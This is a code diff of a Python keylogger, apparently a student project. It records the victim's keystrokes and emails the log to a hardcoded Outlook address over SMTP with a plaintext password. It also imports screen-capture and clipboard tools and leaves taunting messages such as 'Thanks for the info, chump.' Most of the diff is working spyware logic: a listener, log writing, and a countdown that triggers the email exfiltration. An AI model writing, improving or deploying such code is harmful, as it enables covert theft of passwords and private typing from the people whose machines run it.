@@ -3,7 +3,7 @@ import smtplib
 import time
 
 # We want to add these imports in case we want to record the user's screen and send it over in video format
-import numpy as np
+
 import pyautogui
 
 from email import encoders
@@ -14,9 +14,19 @@ from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from PIL import ImageGrab
 
-print(
+'''print(
     "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
     "MINE. \nEnjoy using this computer while you still can!")
+'''
+
+file_path = "C:\\Users\\skyle\\SeniorProjects\\Custom Keylogger\\KeystrokeLogger\\pythonProject"  # Enter the file path you want your files to be saved to
+extend = "\\"
+file_merge = file_path + extend
+
+with open(file_path + extend + 'stupid_dummy.txt', 'w') as f:
+    f.write(
+        "Hey, you dummy, I am now collecting all of your key logs. \nAnything that you type in, that information is now "
+        "MINE. \nEnjoy using this computer while you still can!")
 
 # Key information will be stored here
 keys_information = "key_log.txt"
@@ -43,10 +53,6 @@ password = "s1339490"  # Enter email password here
 username = getpass.getuser()
 
 toaddr = "csproject432@outlook.com"  # Enter the email address you want to send your information to
-
-file_path = "C:\\Users\\skyle\\SeniorProjects\\Custom Keylogger\\KeystrokeLogger\\pythonProject"  # Enter the file path you want your files to be saved to
-extend = "\\"
-file_merge = file_path + extend
 
 # Code for recording our screen
 # Screen resolution
@@ -108,7 +114,9 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 
-t = 10
+t = 20
+
+
 def countdown(t):
     while t:
         mins, secs = divmod(t, 60)
@@ -118,9 +126,6 @@ def countdown(t):
     print("Thanks for the info, chump.")
     send_email(keys_information, file_path + extend + keys_information, toaddr)
     exit()
-
-
-countdown(int(t))
 
 
 # get the clipboard contents
@@ -157,6 +162,7 @@ while number_of_iterations < number_of_iterations_end:
 
     count = 0
     keys = []
+    number_of_iterations += 1
 
 
     def on_press(key):
@@ -174,7 +180,7 @@ while number_of_iterations < number_of_iterations_end:
 
 
     def write_file(keys):
-        with open(file_path + extend + keys_information, "a") as f:
+        with open(file_path + extend + keys_information, 'w') as f:
             for key in keys:
                 k = str(key).replace("'", "")
                 if k.find("space") > 0:
@@ -192,9 +198,6 @@ while number_of_iterations < number_of_iterations_end:
             return False
 
 
-    with Listener(on_press=on_press, on_release=on_release) as listener:
-        listener.join()
-
     if currentTime > stoppingTime:
         with open(file_path + extend + keys_information, "w") as f:
             f.write(" ")
@@ -209,29 +212,6 @@ while number_of_iterations < number_of_iterations_end:
         currentTime = time.time()
         stoppingTime = time.time() + time_iteration
 
-"""
-We need to rewrite the keystroke getter
-    while len(full_log) < char_limit:
-        if key == Key.space or key == Key.enter:
-            word += ' '
-            full_log += word
-            word = ''
-        if len(full_log) >= char_limit:
-            send_log(keys_info, file_path + extend + keys_info, to_address)
-            full_log = ''
-            print("Your logs are now sent. Thanks chump.")
-        elif key == Key.shift_l or key == Key.shift_r:
-            return
-        elif key == Key.backspace:
-            word = word[:-1]
-        else:
-            char = f'{key}'
-            char = char[1:-1]
-            word += char
-
-        if key == Key.esc:
-            return False
-
-    with Listener(on_press=on_press) as listener:
-        listener.join("Your logs are now sent. Thanks chump.")
-        """
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        countdown(int(t))
+        listener.join()
